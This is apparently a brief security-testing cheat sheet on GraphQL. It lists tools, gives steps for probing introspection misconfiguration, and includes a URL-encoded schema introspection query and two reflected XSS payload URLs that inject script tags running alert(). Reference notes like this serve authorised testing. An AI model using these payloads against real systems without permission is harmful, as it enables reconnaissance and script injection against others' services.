# GraphQL

## Tools

```text
https://github.com/doyensec/inql
https://github.com/swisskyrepo/GraphQLmap
```

```text
Past schema here: https://apis.guru/graphql-voyager/

To test a server for GraphQL introspection misconfiguration: 
1) Intercept the HTTP request being sent to the server 
2) Replace its post content / query with a generic introspection query to fetch the entire backend schema 
3) Visualize the schema to gather juicy API calls. 
4) Craft any potential GraphQL call you might find interesting and HACK away!

example.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}

XSS in GraphQL:
http://localhost:4000/example-1?id=%3C/script%3E%3Cscript%3Ealert('I%20%3C3%20GraphQL.%20Hack%20the%20Planet!!')%3C/script%3E%3Cscript%3E
http://localhost:4000/example-3?id=%3C/script%3E%3Cscript%3Ealert('I%20%3C3%20GraphQL.%20Hack%20the%20Planet!!')%3C/script%3E%3Cscript%3E
```

